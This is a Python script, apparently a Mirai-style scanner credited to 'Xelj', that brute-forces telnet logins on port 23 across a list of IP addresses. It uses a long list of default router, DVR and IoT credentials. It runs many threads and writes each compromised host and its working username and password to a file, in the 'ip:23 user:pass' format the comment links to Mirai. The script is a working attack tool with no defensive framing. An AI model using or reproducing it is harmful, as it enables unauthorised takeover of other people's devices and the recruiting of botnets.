#!/usr/bin/python
import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout

if len(sys.argv) < 4:
	print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
	sys.exit()

combo = [ 
	"root:root",
	"admin:admin",
  "daemon:daemon",
  "root:vizxv",
  "root:pass",
  "root:anko",
	"root:",
	"admin:",
	"root:xc3511",
  "default:",
  "default:default",
  "supervisor:zyad1234",
  "root:5up",
  "default:lJwpbo6",
	"User:admin",
	"guest:12345",
  "guest:password",
  "root:zlxx.",
	"admin:1234",
	"admin:12345",
  "telnet:telnet",
  "admin:1234567",
	"admin:password",
  "root:88888888",
  "root:klv1234",
  "root:Zte521",
  "root:hi3518",
  "root:jvbzd",
  "root:7ujMko0vizxv",
  "root:7ujMko0admin",
  "root:ikwb",
  "root:dreambox",
  "root:user",
  "root:realtek",
  "root:00000000",
  "admin:1111111",
  "admin:54321",
  "admin:123456",
  "default:123456",
  "default:S2fGqNFs",
"default:OxhlwSG8",
"default:antslq",
"default:tlJwpbo6",
"root:default",
"default:pass",
"default:12345",
"default:password",
"root:taZz@23495859",
"root:20080826",
"admin:7ujMko0admin",
"root:gforge",
"root:zsun1188",
"admin:synnet",
"root:t0talc0ntr0l4!",
"guest:1111",
"root:admin1234",
"root:tl789",
"admin:fliradmin",
"root:12345678",
"root:1234567890",
"root:vertex25ektks123",
"root:admin@mymifi",
  "admin:7ujMko0admin",
  "admin:pass",
  "admin:meinsm",
  "admin:admin1234",
  "root:1111",
  "admin:1111",
  "root:666666",
  "root:klv123",
  "Administrator:admin",
  "service:service",
  "supervisor:supervisor",
  "guest:12345",
  "admin1:password",
  "administrator:1234",
  "666666:666666",
  "888888:888888",
  "tech:tech"
  "admin:dvr2580222",
  "ubnt:ubnt",
  "user:12345",
  "admin:aquario",
  "root:zsun1188",
  "default:lJwpbo6",
	"guest:guest",
	"user:user",
	"root:Zte521",
  "root:abc123",
  "root:admin",
  "root:xc3511",
  "root:Serv4EMC",
  "root:zsun1188",
  "root:123456",
	"default:OxhlwSG8",
	"default:S2fGqNFs",
  "admin:smcadmin"
  "admin:adslnadam",
	"sysadm:sysadm",
	"support:support",
	"root:default",
	"root:password",
	"adm:",
	"bin:",
	"daemon:",
	"root:cat1029",
	"admin:cat1029",
	"admin:123456",
	"root:antslq",
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
	queue_count += 1
	stdout.write("\r[%d] Coded By Xelj" % queue_count)
	stdout.flush()
	queue.put(ip)
print "\n"


class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		username = ""
		password = ""
		for passwd in combo:
			if ":n/a" in passwd:
				password=""
			else:
				password=passwd.split(":")[1]
			if "n/a:" in passwd:
				username=""
			else:
				username=passwd.split(":")[0]
			try:
				tn = socket.socket()
				tn.settimeout(8)
				tn.connect((self.ip,23))
			except Exception:
				tn.close()
				break
			try:
				hoho = ''
				hoho += readUntil(tn, "ogin:")
				if "ogin" in hoho:
					tn.send(username + "\n")
					time.sleep(0.09)
			except Exception:
				tn.close()
			try:
				hoho = ''
				hoho += readUntil(tn, "assword:")
				if "assword" in hoho:
					tn.send(password + "\n")
					time.sleep(0.8)
				else:
					pass
			except Exception:
				tn.close()
			try:
				prompt = ''
				prompt += tn.recv(40960)
				if ">" in prompt and "ONT" not in prompt:
					success = True
				elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
					success = True				
				else:
					tn.close()
				if success == True:
					try:
						os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
						print "\033[37m[\033[32m+\033[37m] \033[33mRoted \033[37m-> \033[32m%s\033[37m:\033[32m%s\033[37m:\033[33m%s\033[37m"%(username, password, self.ip)
						tn.close()
						break
					except:
						tn.close()
				else:
					tn.close()
			except Exception:
				tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				IP = queue.get()
				thread = router(IP)
				thread.start()
				queue.task_done()
				time.sleep(0.02)
			except:
				pass
	except:
		pass

for l in xrange(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
	except:
		pass
